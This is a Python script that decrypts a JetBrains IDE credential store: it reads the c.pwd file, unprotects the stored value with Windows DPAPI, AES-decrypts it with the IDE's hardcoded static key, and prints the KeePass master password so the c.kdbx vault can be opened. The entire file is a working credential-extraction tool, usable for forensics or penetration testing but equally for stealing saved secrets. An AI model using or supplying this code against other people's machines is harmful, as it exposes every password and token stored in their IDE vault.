import base64
import binascii
import pathlib
import struct
import sys

import win32crypt
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# The Master Password is encrypted with this static key
# https://github.com/JetBrains/intellij-community/blob/e84b32f0620126b0e2b3a3f477cda8c1c9b5b4d2/platform/credential-store/src/EncryptionSupport.kt#L16-L19
CONTAINER_KEY = "Proxy Config Sec"
# https://github.com/cdeptula/intellij-community/blob/41de88111b8d8b65a69e678f0cc1e9b03753a92b/platform/credential-store/src/keePass/masterKey.kt#L162
ENCRYPT_VALUE_START = "value: !!binary ".encode()


def decrypt(path):
    print("[+] Reading encrypted container as bytes")
    master_key_file_content = pathlib.Path(path).read_bytes()

    master_key_encoded = None
    for line in master_key_file_content.splitlines():
        if line.startswith(ENCRYPT_VALUE_START):
            master_key_encoded = line.replace(ENCRYPT_VALUE_START, b"")
            break
    if not master_key_encoded:
        print("Master Key encoded value not found")
        return

    enc_bytes_array = base64.b64decode(master_key_encoded)

    print("[+] Encrypted bytes:")
    print(binascii.hexlify(enc_bytes_array))

    print("[+] Decrypted bytes from Credential Manager")
    decrypted_container = win32crypt.CryptUnprotectData(enc_bytes_array, Flags=0)[1]
    print(binascii.hexlify(decrypted_container))

    iv_length = struct.unpack(">i", decrypted_container[:4])[0]
    print("IV Length: " + str(iv_length))

    iv = decrypted_container[4 : 4 + iv_length]
    print("[+] IV: " + str(binascii.hexlify(iv)))

    data = decrypted_container[4 + iv_length :]
    print("[+] Payload length: " + str(len(data)))

    key = CONTAINER_KEY.encode("ascii")
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    result = unpad(cipher.decrypt(data), AES.block_size).decode("ascii")

    print("-------------------------------------")
    print("[+] Master password")
    print(result)
    print("-------------------------------------")
    print("You can open c.kdbx with KeePass and this password")
    print("KeePass Downloads https://keepass.info/download.html")


if __name__ == "__main__":
    # Program Entry Point
    if len(sys.argv) != 2:
        print("This program takes one parameter: the path to c.pwd")
        exit(1)

    decrypt(sys.argv[1])
